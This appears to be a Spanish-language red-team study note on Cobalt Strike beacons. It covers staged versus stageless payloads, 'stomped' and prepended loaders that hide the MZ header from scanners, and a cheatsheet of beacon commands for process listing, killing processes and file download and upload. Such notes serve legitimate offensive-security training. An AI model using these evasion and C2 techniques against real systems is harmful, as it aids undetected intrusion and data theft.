---
tags: [c2, cobalt-strike, beacon, staged, stageless]
status: done
---

# Beacons — Tipos y Carga

> Diferentes tipos de beacon de Cobalt Strike y cómo se cargan en memoria.

---

## Staged vs Stageless

### Staged
```
Stager (pequeño, ~100KB) → descarga Beacon completo desde Team Server
```
- **Pro:** Payload inicial pequeño → más fácil de incluir en exploits con límite de tamaño
- **Con:** Hace petición de red adicional al Team Server → detectable, necesita TS online en el momento del staging

### Stageless
```
Beacon completo embebido en el payload desde el principio
```
- **Pro:** No necesita contacto adicional en staging, funciona offline inicialmente
- **Con:** Payload más grande (~500KB+)

**Recomendación para red team:** Stageless siempre que sea posible.

---

## Cómo se Carga el Beacon (Loaders)

### Stomped Loader

El beacon modificado para que el header MZ sea reemplazado:

```c
// Truco del byte MZ
// El beacon empaquetado tiene el header MZ al principio
// El loader "pisa" los primeros bytes con datos inocuos
// Al cargar, restaura el MZ antes de ejecutar

// Verificación del truco:
// bytes[0] = 0x4D ('M')
// bytes[1] = 0x5A ('Z')
// → Estos se reemplazan antes de escribir a disco/memoria
```

**Por qué:** El string "MZ" al inicio de un archivo/buffer es señal inmediata de PE para scanners.

### Prepended Loader

El shellcode del loader está **antes** del beacon en el buffer:

```
[LOADER SHELLCODE][BEACON PE]
    ↑
    RIP comienza aquí
    El loader ubica y carga el PE que viene detrás
```

**Ventajas sobre Stomped:**
- El loader y el beacon son completamente independientes en memoria
- Más flexible para evasión del loader sin modificar el beacon

---

## Beacon Cheatsheet

→ Ver [[Fork & Run vs BOF]] para comandos detallados por tipo de ejecución.

```
# Estado básico
beacon> sleep 0         # Modo interactivo (sin delay)
beacon> sleep 60 30    # Callback cada 60s ± 30% jitter
beacon> checkin         # Forzar callback inmediato

# Información del sistema
beacon> sysinfo
beacon> getuid          # Usuario actual
beacon> getpid          # PID del beacon

# Procesos
beacon> ps              # Listar procesos
beacon> kill <pid>

# Ficheros
beacon> ls
beacon> cd <dir>
beacon> pwd
beacon> download <file>
beacon> upload <local> <remote>
```

